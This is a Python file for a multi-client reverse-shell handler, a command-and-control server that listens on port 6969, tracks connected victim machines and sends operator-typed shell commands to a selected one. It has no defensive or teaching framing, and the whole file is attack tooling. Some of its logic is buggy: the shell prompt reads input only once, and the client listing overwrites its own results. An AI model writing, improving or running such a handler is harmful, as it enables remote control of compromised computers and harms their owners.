import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_conns = []
all_adds = []


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 6969
        s = socket.socket()

    except socket.error as msg:
        print("Connection Error: \n" + str(msg) + "\n Exiting....")


def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding socket, Port Number:- " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Binding Error: \n" + str(msg) + "\n Retrying....")
        bind_socket()


def accept_conns():
    for c in all_conns:
        c.close()

    del all_conns[:]
    del all_adds[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)

            all_conns.append(conn)
            all_adds.append(address)

            print("Connection established with IP :-  " + address[0])
        except:
            print("Error \n Unable accept the connection")


def start_shell():
    # In ur face marvel fanboys/girls  X)
    cmd = input('thanus> ')
    while True:
        if cmd == "list":
            list_conns()
        elif "select" in cmd:
            conn = get_conns(cmd)

            if conn is not None:
                send_cmds(conn)
        else:
            print("Illegal Command")


def list_conns():
    result = ""

    for i, conn in enumerate(all_conns):
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del all_conns[i]
            del all_adds[i]
            continue

        result = str(i) + "  " + \
            str(all_adds[i][0]) + "  " + str(all_adds[i][1]) + " \n"

    print("#-------- All Clients --------#" + "\n" + result)


def get_conns(cmd):
    try:
        target = int(cmd.replace("select ", ""))

        conn = all_conns[target]

        print("You are now connected to : " + str(all_adds[target][0]))
        print(str(all_adds[target][0]) + "> ", end="")

        return conn

    except:
        print("Invalid Selection")


def send_cmds(conn):
    while True:
        try:
            cmd = input()

            if cmd == "quit":
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_res = str(conn.recv((1024)), "utf-8")
                print(client_res, end="")
        except:
            print("Error sending Command")
            break


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()

        if x == 1:
            create_socket()
            bind_socket()
            accept_conns()
        if x == 2:
            start_shell()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


if __name__ == "__main__":
    create_workers()
    create_jobs()
